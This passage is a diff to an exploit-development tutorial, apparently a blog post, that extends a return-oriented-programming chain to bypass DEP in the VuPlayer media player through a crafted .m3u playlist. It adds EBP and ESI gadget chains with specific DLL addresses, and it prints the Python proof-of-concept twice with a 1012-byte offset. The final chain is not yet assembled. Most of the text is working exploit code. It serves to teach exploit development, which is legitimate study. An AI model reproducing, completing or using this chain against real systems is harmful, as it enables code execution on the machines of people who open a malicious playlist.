@@ -488,5 +488,167 @@ To the astute reader: now that you've seen the static XOR gadget for EAX, is the
 EBX chain crushed, moving on!
 
 ## EBP ROP Chain
+Looking at our goals, we need EBP to point to a `jmp esp` type instruction. I used mona to find such an instruction at `0x1010539f`, now we just need a gadget to pop it into EBP.
 
+I found such a gadget at `0x10017c0d`: `# POP EBP # RETN 0x04`. Because it's a `RETN 0x04` instead of a normal `RETN`, I used two more `RETN` gadgets (ROP NOPs) as filler so that my chain would continue working as intended, this just required some trial and error, I recommend trying it without the filler and seeing what happens. 
+
+This one was relatively straightforward, just POP'ing the desired value into the register and then adding filler to compensate for the non-defaul `RETN`. 
+
+Updated POC:
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop {COMPLETED}                                                
+# ECX <writeable pointer> => lpflOldProtect {COMPLETED}                                 
+# EDX 00000040 => flNewProtect {COMPLETED}                             
+# EBX 00000201 => dwSize {COMPLETED}                                            
+# ESP ???????? => Leave as is                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..) {COMPLETED}                
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+# EDI 10101008 => ROP-Nop same as EIP
+
+# EAX Chunk Affects: EAX
+eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
+eax += struct.pack('<L', 0x90909090)
+
+# ECX Chunk Affects: ECX
+ecx = struct.pack('<L', 0x10601007) # a pointer to # POP ECX # RETN
+ecx += struct.pack('<L', 0x101053DC)    # found a spot in the RWX space of BASSWMA.dll for our writable pointer
+
+# EDX Chunk Affects: EAX, EDX
+edx = struct.pack('<L', 0x106074f8) # a pointer to # XOR EAX,EAX # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10038a6c)    # a pointer to # XCHG EAX,EDX # RETN
+
+# EBX Chunk Affects: EAX, EBX
+ebx = struct.pack('<L', 0x10015fe7) # a pointer to a # POP EAX # RETN
+ebx += struct.pack('<L', 0x994801bc)    # once XOR'd w the static value 994803BD, this will result in 0x201
+ebx += struct.pack('<L', 0x1003a074)    # a pointer to # XOR EAX,994803BD # RETN
+ebx += struct.pack('<L', 0x10032f32)    # a pointer to # XCHG EAX,EBX # RETN 0x00
+
+# EBP Chunk Affects: EBP
+ebp = struct.pack('<L', 0x10017c0d) # a pointer to a # POP EBP # RETN 0x04
+ebp += struct.pack('<L', 0x1010539F)    # pointer to JMP ESP
+ebp += struct.pack('<L', 0x10101008)    # pointer to a ROP NOP to compensate for the RETN 0x04
+ebp += struct.pack('<L', 0x10101008)    # pointer to a ROP NOP to compensate for the RETN 0x04
+
+rop = ""
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += rop
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
+
+Crushed, onto next goal. 
+
+## ESI ROP Chain
+Looking at our goals from FuzzySec, we need *'PTR to VirtualProtect - DWORD PTR of 0x1060E25C'* in ESI. This means, we have the memory address of the API call to `VirtualProtect`, but we need the `DWORD` value stored there, not just the address. I struggled to find good gadgets for ESI operations, but once again, I resorted to using EAX. 
+
+Getting a pointer to the memory address into EAX is easy, we'll just POP `0x1060E25C` into it. After that, we'll need a gadget that loads the content of `[EAX]` into `EAX`. One such gadget exists at `0x1001eaf1`. Luckily I faced a similar situation before this walking through my first exploit with the FuzzySec example and knew what kind of gadget to target first and found it right away. We can then end the chain with a gadget stored at `0x10030950` which does an `# XCHG EAX,ESI # RETN`. 
+
+In summary for this one, we are:
++ `POP` pointer to API into EAX
++ move the `DWORD` value held at the address into EAX
++ exchange EAX and ESI
+
+Updated POC:
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop {COMPLETED}                                                
+# ECX <writeable pointer> => lpflOldProtect {COMPLETED}                                 
+# EDX 00000040 => flNewProtect {COMPLETED}                             
+# EBX 00000201 => dwSize {COMPLETED}                                            
+# ESP ???????? => Leave as is                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..) {COMPLETED}                
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+# EDI 10101008 => ROP-Nop same as EIP
+
+# EAX Chunk Affects: EAX
+eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
+eax += struct.pack('<L', 0x90909090)
+
+# ECX Chunk Affects: ECX
+ecx = struct.pack('<L', 0x10601007) # a pointer to # POP ECX # RETN
+ecx += struct.pack('<L', 0x101053DC)    # found a spot in the RWX space of BASSWMA.dll for our writable pointer
+
+# EDX Chunk Affects: EAX, EDX
+edx = struct.pack('<L', 0x106074f8) # a pointer to # XOR EAX,EAX # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
+edx += struct.pack('<L', 0x10038a6c)    # a pointer to # XCHG EAX,EDX # RETN
+
+# EBX Chunk Affects: EAX, EBX
+ebx = struct.pack('<L', 0x10015fe7) # a pointer to a # POP EAX # RETN
+ebx += struct.pack('<L', 0x994801bc)    # once XOR'd w the static value 994803BD, this will result in 0x201
+ebx += struct.pack('<L', 0x1003a074)    # a pointer to # XOR EAX,994803BD # RETN
+ebx += struct.pack('<L', 0x10032f32)    # a pointer to # XCHG EAX,EBX # RETN 0x00
+
+# EBP Chunk Affects: EBP
+ebp = struct.pack('<L', 0x10017c0d) # a pointer to a # POP EBP # RETN 0x04
+ebp += struct.pack('<L', 0x1010539F)    # pointer to JMP ESP
+ebp += struct.pack('<L', 0x10101008)    # pointer to a ROP NOP to compensate for the RETN 0x04
+ebp += struct.pack('<L', 0x10101008)    # pointer to a ROP NOP to compensate for the RETN 0x04
+
+# ESI Chunk Affects: EAX, ESI
+esi = struct.pack('<L', 0x10015fe7) # a pointer to a # POP EAX # RETN
+esi += struct.pack('<L', 0x1060E25C)    # virtual protect pointer 
+esi += struct.pack('<L', 0x1001eaf1)    # a pointer to # MOV EAX,DWORD PTR DS:[EAX] # RETN
+esi += struct.pack('<L', 0x10030950)    # a pointer to # XCHG EAX,ESI # RETN
+
+rop = ""
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += rop
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
 
